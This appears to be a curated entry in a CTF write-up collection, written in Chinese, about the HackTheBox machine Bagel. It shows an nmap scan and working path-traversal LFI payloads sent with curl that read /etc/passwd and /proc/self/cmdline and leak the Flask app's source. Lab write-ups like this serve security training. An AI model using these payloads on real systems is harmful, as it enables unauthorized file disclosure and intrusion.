---
title: HackTheBox Bagel WriteUp
contest: HackTheBox Bagel
year: 2023
difficulty: medium
vuln_type: lfi
tags: [htb, pentest, nmap, lfi, path-traversal, flask, proc-cmdline, json-parser]
attack_chain:
  - nmap扫描: 22/5000/8000端口
  - 8000端口Werkzeug 2.2.2 + Python 3.10.9 Flask
  - LFI: curl 'http://bagel.htb:8000?page=../../../../../../etc/passwd'
  - 读取/proc/self/cmdline获取app路径 /home/developer/app/app.py
  - 下载 app.py 源码
  - Flask + websocket + json 解析器
  - 进一步利用
key_payload: curl 'http://bagel.htb:8000?page=../../../../../../etc/passwd'
one_liner: HTB Bagel：Flask 8000端口LFI读源码+WebSocket
lesson: Flask ?page=参数易出LFI，可读/proc/self/cmdline定位应用
quality: high
---

# HackTheBox Bagel WriteUp

## 题目信息
- 平台：HackTheBox
- 题目：Bagel
- 类别：Pentest 实战

## 关键攻击链
### 1. 端口扫描
```bash
sudo nmap -Pn -n -v --reason -sS -p- --min-rate=1000 -A 10.10.11.201 -oN nmap.log
# 22/tcp open ssh
# 5000/tcp open upnp?
# 8000/tcp open http-alt Werkzeug/2.2.2 Python/3.10.9
```

### 2. LFI 探测
```bash
$ curl 'http://bagel.htb:8000?page=../../../etc/passwd'
File not found
$ curl 'http://bagel.htb:8000?page=../../../../../../etc/passwd'
root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000::/home/developer:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
```

### 3. 源码泄露
```bash
$ curl 'http://bagel.htb:8000?page=../../../../../../proc/self/cmdline' --output cmdline
$ cat cmdline
python3/home/developer/app/app.py

$ curl 'http://bagel.htb:8000?page=../../../../../../home/developer/app/app.py' --output app.py
$ cat app.py
from flask import Flask, request, send_file, redirect, Response
import os.path
import websocket, json
app = Flask(__name__)
```

### 4. 进一步攻击
- Flask + WebSocket + JSON 解析器
- 进一步利用 LFI + WebSocket

## 评分
- quality: high（LFI + Flask 源码泄露 + WebSocket 进一步利用）
